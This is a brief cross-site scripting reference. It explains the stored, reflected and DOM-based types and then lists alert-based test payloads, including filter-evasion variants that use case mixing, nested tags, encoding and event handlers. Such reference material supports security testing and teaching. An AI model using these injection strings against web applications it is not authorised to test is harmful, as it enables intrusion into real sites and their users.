Cross Site Scripting
----------------------------

Types of XSS injections:

1)Stored - it is possible when a website or web application stores user input and later serves it to other users. An application is vulnerable if it does not validate user input before storing content and embedding it into HTML response pages.


2)Reflected - the attacker’s payload has to be a part of the request that is sent to the web server. It is then reflected back in such a way that the HTTP response includes the payload from the HTTP request. Attackers use malicious links, phishing emails, and other social engineering techniques to lure the victim into making a request to the server.


3)DOM base - It is possible if the web application’s client-side scripts write data provided by the user to the Document Object Model (DOM). The data is subsequently read from the DOM by the web application and outputted to the browser. If the data is incorrectly handled, an attacker can inject a payload, which will be stored as part of the DOM and executed when the data is read back from the DOM.

Basic payload:
```
';alert('xss inj');' 
<script>alert('xss inj')</script>
<sCrIpt>alert(1)</ScRipt>
<scr<script>ipt>alert('xss inj')</scr<script>ipt>
"><script>alert('xss inj')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
%3Cscript%3Ealert(%27xss%20inj%27)%3C%2Fscript%3E
%253Cscript%253Ealert(%2527xss%2520inj%2527)%253C%252Fscript%253E
#"><img src=/ onerror=alert(2)>
```

Image payload
```
<img src="javascript:alert('xss inj');">
<img """><script>alert("xss inj")</script>">
<img src= onmouseover="alert('xxs')">
<img src=x onerror="alert(String.fromCharCode(88,83,83))"></img>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
```

HTML5 payload
```
<body onload=alert(/xss/.source)>
<select autofocus onfocus=alert('xss inj')>
<input autofocus onfocus=alert('xss inj')>
<textarea autofocus onfocus=alert('xss inj')>
```

What is available for manipulation:
1.Cookie 
2.DOM
3.Connectivity
4.Async JS requests 


References:
-------------------------------------
[Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)  
[Owasp](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
